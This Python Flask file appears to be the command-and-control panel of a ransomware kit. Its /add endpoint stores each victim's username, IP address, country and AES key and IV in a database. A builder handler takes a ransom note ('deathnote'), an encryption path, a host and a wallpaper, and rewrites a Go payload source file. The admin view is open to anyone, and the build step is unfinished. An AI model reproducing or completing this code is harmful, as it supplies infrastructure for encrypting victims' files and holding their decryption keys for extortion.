from flask import Flask,render_template,redirect,url_for,request,jsonify
from datetime import date
import psutil
import platform
import socket
import requests
import os
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from flask_admin import Admin
from flask_admin.contrib.sqla import ModelView
from flask_socketio import SocketIO
from pathlib import Path

app = Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:////" + os.getcwd() + "/database.db"
app.config['SECRET_KEY'] = 'thisissecret'
db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'
#admin = Admin(app)
admin = Admin(app)
socketio = SocketIO(app)


class Data(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    Username = db.Column(db.String(20), nullable=False)
    Ip = db.Column(db.String(20), nullable=False)
    Country = db.Column(db.String(20), nullable=False)
    Uniqe_iD = db.Column(db.String(64), nullable=False)
    Iv = db.Column(db.String(64), nullable=False)
    Aes = db.Column(db.String(64), nullable=False)
    

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    Username = db.Column(db.String(20), nullable=False)
    Password = db.Column(db.String(20), nullable=False)


@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

version = str(0.1) + " beta"

@app.route('/')
def hello_world():
    cpux = psutil.cpu_percent()
    ram = psutil.virtual_memory()
    return render_template("index.html", Cpu=cpux, Mem=ram.percent, date=date.today(), version=version)


@app.route('/builder')
def builder():
    distrox = socket.gethostname()
    try:
        user = os.environ['USERNAME']
    except:
        user = os.environ['USER']
    return render_template("builder.html",distro=distrox, user=user)

@app.route('/start')
#@login_required
def start():
    try:
        ip = requests.get("https://ident.me").content.decode()
    except:
        ip = "127.0.0.1"
    osx = platform.platform()
    version = "0.1"
    distrox = socket.gethostname()
    try:
        user = os.environ['USERNAME']
    except:
        user = os.environ['USER']
    trace = Data.query.all()
    return render_template("home.html", IP=ip, Useragent="Mozilla/5.0 (Windows NT 6.2)", os=osx, version=version,
                           distro=distrox, user=user,darkly=trace)

@app.route("/add",methods=["POST","GET"])
def add():
    try:
        data = request.get_json(force=True)
        print(data)
    except Exception as e:
        if "this server could not understand" in str(e):
            return jsonify({'error': 'Not valid json'})
        else:
            return jsonify({'error': str(e)})
    try:
        username = data["username"]
        unique_id = data["unique_id"]
        key = data["key"]
        iv = data["iv"]
        Ip = request.remote_addr
        Country = requests.get("https://geolocation-db.com/jsonp/" + Ip).content.decode().split("(")[1].strip(")").split(",")[1].split(":")[1].replace("\"","")
        addme = Data(Username=username, Ip=Ip,Country=Country,Uniqe_iD=unique_id,Iv=iv,Aes=key)
        db.session.add(addme)
        db.session.commit()
    except KeyError:
        return jsonify({'error': 'missing peremeter'})
    except Exception as e:
        print (e)
        return jsonify({'error': 'Sorry there is some kind of error'})
    response = jsonify({'success': 'new user '+username+' has been created'})
    response.headers.add('Access-Control-Allow-Origin', '*')
    return response

def writeline(linenumber):
    homepath = str(Path.home())
    a_file = open(homepath + "/go/src/ninja/main.go", "r")
    list_of_lines = a_file.readlines()
    list_of_lines[linenumber] = "Line2\n"
    a_file = open(homepath + "/go/src/ninja/main.go", "w")
    a_file.writelines(list_of_lines)
    a_file.close()

@socketio.on('startbuild')
def startbuilding(data):
    deathnote = data["note"]
    cryptpath = data["cryptpath"]
    host = data["host"]
    wallpaper = data["wallpaper"]
    writeline



"""   
@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('index'))
"""
class UserModelView(ModelView):
    def is_accessible(self):
        try:
            if current_user.username == "weed_Ok":
                return True
            return True
        except:
            return True

    def _handle_view(self, name):
        if not self.is_accessible():
            return redirect(url_for('login'))

admin.add_view(UserModelView(Data, db.session))
admin.add_view(UserModelView(User, db.session))

if __name__ == '__main__':
    app.run(debug=True)